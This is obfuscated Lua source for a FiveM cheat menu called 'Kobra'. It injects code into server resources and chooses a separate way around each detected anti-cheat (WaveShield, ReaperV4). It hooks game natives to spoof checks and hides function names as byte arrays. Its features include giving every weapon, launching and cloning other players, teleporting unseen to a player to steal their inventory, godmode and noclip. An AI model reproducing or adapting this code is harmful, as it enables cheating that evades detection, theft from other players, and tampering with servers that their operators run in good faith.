                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v247) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v248,v249,v250) if ( not v249 or ( #v249==0)) then return;end local v251=tonumber(v249[2 -1 ]);if  not v251 then return;end v250=v250 or (5027 -2027) ;local function v252(v350,v351) local v352=0;local v353;local v354;while true do if (v352==(775 -(48 + 725))) then return v353;end if (v352==0) then v353={};v354=PlayerPedId();v352=1 -0 ;end if (v352==(2 -1)) then if  not v354 then return v353;end for v775=0,149 + 106  do local v776=0 -0 ;local v777;while true do if (v776==(0 + 0)) then v777=GetPlayerFromServerId(v775);if (v777 and (v777~= -(1 + 0)) and DoesEntityExist(GetPlayerPed(v777))) then local v1078=GetPlayerPed(v777);local v1079=GetEntityCoords(v1078);if v1079 then local v1185=853 -(152 + 701) ;local v1186;while true do if (v1185==0) then v1186= #(v350-v1079);if (v1186<=v351) then table.insert(v353,{player=v777,serverId=v775});end break;end end end end break;end end end v352=1313 -(430 + 881) ;end end end CreateThread(function() local v355=GetPlayerFromServerId(v251);if ( not v355 or (v355== -1)) then return;end local v356=GetPlayerPed(v355);if ( not v356 or  not DoesEntityExist(v356)) then return;end local v357=PlayerPedId();if  not v357 then return;end local v358=GetEntityCoords(v357);local v359=GetEntityCoords(v356);if ( not v358 or  not v359) then return;end local v360= #(v358-v359);local v361=false;local v362=nil;if (v360>(4 + 6)) then local v616=895 -(557 + 338) ;local v617;local v618;local v619;local v620;local v621;while true do if (v616==1) then v618=math.random(5,9);v619=math.cos(v617) * v618 ;v616=2;end if (v616==(0 + 0)) then v362=v358;v617=math.random() * (5 -3) * math.pi ;v616=1;end if (v616==3) then SetEntityCoordsNoOffset(v357,v621.x,v621.y,v621.z,false,false,false);SetEntityVisible(v357,false,0 -0 );v616=4;end if (v616==(4 -2)) then v620=math.sin(v617) * v618 ;v621=vector3(v359.x + v619 ,v359.y + v620 ,v359.z);v616=3;end if ((8 -4)==v616) then v361=true;Wait(901 -(499 + 302) );break;end end end local v363=v252(v359,v250);if ( #v363==0) then end ClearPedTasksImmediately(v357);for v555=1,15 do if  not DoesEntityExist(v356) then break;end local v556=GetEntityCoords(v356);if  not v556 then break;end SetEntityCoords(v357,v556.x,v556.y,v556.z + 0.5 ,false,false,false,false);Wait(916 -(39 + 827) );AttachEntityToEntityPhysically(v357,v356,0 -0 ,0 -0 ,0,0 -0 ,230 -80 ,0 + 0 ,0 -0 ,0 + 0 ,0 -0 ,0,1,false,false,1,106 -(103 + 1) );Wait(50);DetachEntity(v357,true,true);Wait(100);end Wait(500);ClearPedTasksImmediately(v357);if v362 then SetEntityCoords(v357,v362.x,v362.y,v362.z + (555 -(475 + 79)) ,false,false,false,false);Wait(100);SetEntityCoords(v357,v362.x,v362.y,v362.z,false,false,false,false);end if v361 then SetEntityVisible(v357,true,0);end end);end;v12.HandleClonePlayer=function(v253,v254) if ( not v254 or ( #v254==0)) then return;end local v255=table.concat(v254,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v255));end;v12.HandleTakeInventory=function(v256,v257) local v258=0 -0 ;local v259;local v260;while true do if (v258==(0 -0)) then if ( not v257 or ( #v257==(0 + 0))) then return;end v259=tonumber(v257[1 + 0 ]);v258=1;end if (v258==(1505 -(1395 + 108))) then v260=GetResourceState("WaveShield")=="started" ;if v260 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v259));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v259));end break;end if (v258==(2 -1)) then if  not v259 then return;end print("Take Inventory action executed for players: "   .. table.concat(v257,", ") );v258=1206 -(7 + 1197) ;end end end;v12.BuildMenuFromWeaponList=function(v261,v262) local v263={};for v364,v365 in ipairs(v262) do if v46[v365] then v263[ #v263 + 1 ]=v46[v365].label;end end return v263;end;v12.GetWeaponModelFromLabel=function(v264,v265) local v266=0 + 0 ;while true do if (v266==(0 + 0)) then for v719,v720 in pairs(v46) do if (v720.label==v265) then return v719;end end return "";end end end;v12.RepairVehicle=function(v267) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v268) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v366={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 -0 ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 -0 ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v557=0;local v558;local v559;while true do if (v557==(0 -0)) then print("2");v558=GetResourceState("WaveShield")=="started" ;v557=1 -0 ;end if (v557==1) then v559=GetResourceState("ReaperV4")=="started" ;if v558 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v559 then MachoInjectThread(139 -(43 + 96) ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end end end,["mc9-medicsystem"]=function() local v560=0 -0 ;local v561;local v562;while true do if (v560==1) then v562=GetResourceState("ReaperV4")=="started" ;if v561 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v562 then MachoInjectThread(0,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end if (v560==(0 -0)) then print("1");v561=GetResourceState("WaveShield")=="started" ;v560=1 + 0 ;end end end};for v563,v564 in pairs(v366) do if (GetResourceState(v563)=="started") then v564();end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=197 -97 ,min=0,max=39 + 61 ,step=1,onSelect=function(v367) SetEntityHealth(PlayerPedId(),v367 + 100 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=32 + 68 ,min=0 + 0 ,max=1851 -(1414 + 337) ,step=1,onSelect=function(v368) SetPedArmour(PlayerPedId(),v368);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),100);end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v369) v268:HandleGodmodeToggle(v369);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v370) if v370 then v268:EnableInvisibility();else v268:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=972.25 -(357 + 615) ,min=0.25,max=4 + 1 ,onSelect=function(v371,v372) if v372 then local v624=0 -0 ;while true do if (0==v624) then if  not v29 then local v970=0 + 0 ;while true do if ((2 -1)==v970) then v29=true;break;end if (v970==0) then v12:Notify("info","Kobra","Initializing... Please wait!",800 + 200 );Wait(28 + 372 );v970=1;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
